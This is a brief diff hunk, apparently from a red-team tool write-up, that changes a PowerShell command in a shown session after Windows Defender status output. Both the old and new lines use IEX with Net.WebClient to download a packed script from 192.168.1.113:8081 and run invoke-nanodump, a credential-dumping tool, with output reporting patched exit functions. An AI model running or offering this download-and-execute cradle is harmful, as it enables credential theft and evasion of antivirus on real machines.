@@ -268,7 +268,7 @@ AntispywareEnabled            : True
 AntivirusSignatureLastUpdated : 02/02/2023 04:49:12
 
 
-PS C:\Users\Administrator> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.113:8081/temp/Packed-posh-nano.ps1');invoke-nanodump
+PS C:\Users\Administrator> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.113:8081/temp/Packed-nano.ps1');invoke-nanodump
 
 Exit functions patched: True
 
